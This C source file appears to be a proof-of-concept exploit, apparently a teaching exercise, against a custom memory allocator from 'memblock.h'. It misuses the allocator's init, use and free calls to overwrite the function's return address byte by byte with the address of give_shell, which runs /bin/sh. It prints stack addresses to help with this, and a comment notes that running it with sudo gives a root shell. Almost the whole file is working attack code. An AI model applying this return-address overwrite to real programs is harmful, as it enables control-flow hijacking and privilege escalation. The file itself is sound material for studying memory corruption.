#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "memblock.h"

void give_shell() {
  printf("you get a shell\n");
  system("/bin/sh");
}

void do_test() {
  long array[10];
  long *ptr;

  printf("&array = %p\n", &array);
  printf("&give_shell = %p\n", &give_shell);

  long rbp;
  asm("movq %%rbp, %0;"
      :"=r"(rbp)
     );

  printf("$rbp = %p\n", (void*)rbp);
  printf("ret address = %p\n", (void*)rbp + 0x8);

  struct memblock long_memblock;

  /*
   * use init_mem to have address or array in avail,
   * write offset to targetted memory location + data(byte) to be written
   * at the first location in the array
   * 
   * use use_mem,
   * avail will have targetted memory location + data
   * 
   * use free_mem with first param as targetted address(return address)
   * and the data is written to the targetted address
   *
   * exploit to get shell
   * run the executable with sudo to get root shell
   */

  /* 
   * write the return address to array[0] + data
   * array[0] = offset to rbp + 4 bytes for rbp on stack,
   * array[0] += {subsequent bytes of addr of give_shell} + {1, 2, 3...}
   */

  for (int i = 0; i < 7; i++) {
    init_mem(long_memblock, long, array, 10);
    array[0] = (rbp - (long)&array) + 8 + i + (((long)&give_shell >> (8 * i)) & 0xff);
    ptr = use_mem(long, long_memblock);
    ptr = (long*)((void*)rbp + 8 + i);
    free_mem(ptr, long_memblock);
  }

  printf("bye\n");
}

int main() {
  do_test();
  return 0;
}
